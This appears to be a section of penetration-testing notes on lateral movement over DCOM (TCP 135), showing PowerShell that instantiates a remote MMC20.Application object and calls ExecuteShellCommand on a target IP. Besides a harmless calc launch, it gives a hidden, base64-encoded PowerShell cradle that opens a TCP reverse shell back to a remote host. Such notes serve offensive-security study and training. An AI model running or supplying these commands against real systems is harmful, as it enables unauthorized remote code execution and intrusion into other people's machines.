
### DCOM (135)

Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.

This method allows execution of any shell command as long as the authenticated user is authorized, which is default for local administrators.

We first instantiate a remote MMC 2.0 application

```
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

The application object is now saved into the `$dcom` variable, for which we can pass arguments to

```powershell
# Execute calc
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

# Pop a shell (courtesy of ps_cradle_gen.sh)
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
